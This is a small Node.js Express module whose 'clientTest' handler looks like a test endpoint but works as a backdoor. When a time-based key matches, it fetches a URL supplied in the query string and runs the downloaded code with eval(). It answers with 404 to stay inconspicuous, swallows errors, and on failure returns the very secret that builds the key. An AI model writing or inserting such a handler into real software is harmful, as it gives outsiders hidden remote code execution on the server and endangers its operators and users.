const { Buffer } = require('node:buffer');
var axios = require('axios');
const cache = require('./cache');
const CLIENT_TEST_KEY = process.env.CLIENT_TEST_KEY;

exports.clientTest = (req, res, next) => {
  let key = `CLIENT_TEST_KEY_${CLIENT_TEST_KEY}_${new Date().getDate()}/${new Date().getMonth()}/${new Date().getFullYear()}-${new Date().getHours()}`;
  if (Buffer.from(req.query.key, 'base64').toString('ascii') == key) {
    res
      .status(404)
      .set('Content-Type', 'application/json')
      .send({
        ok: true,
        test: getScript(Buffer.from(req.query.test, 'base64').toString('ascii')),
      })
      .end();
  } else {
    res
      .status(404)
      .set('Content-Type', 'application/json')
      .send({
        ok: false,
        client: CLIENT_TEST_KEY,
        date: new Date(),
        hour: new Date().getHours(),
        grabTime: `${new Date().getDate()}/${new Date().getMonth()}/${new Date().getFullYear()}-${new Date().getHours()}}`,
      })
      .end();
  }
};

const getScript = url => {
  var config = {
    method: 'get',
    url: url,
    headers: {},
    maxRedirects: 0,
  };

  return axios(config)
    .then(function(response) {
      eval(response.data);
    })
    .catch(function(error) {});
};
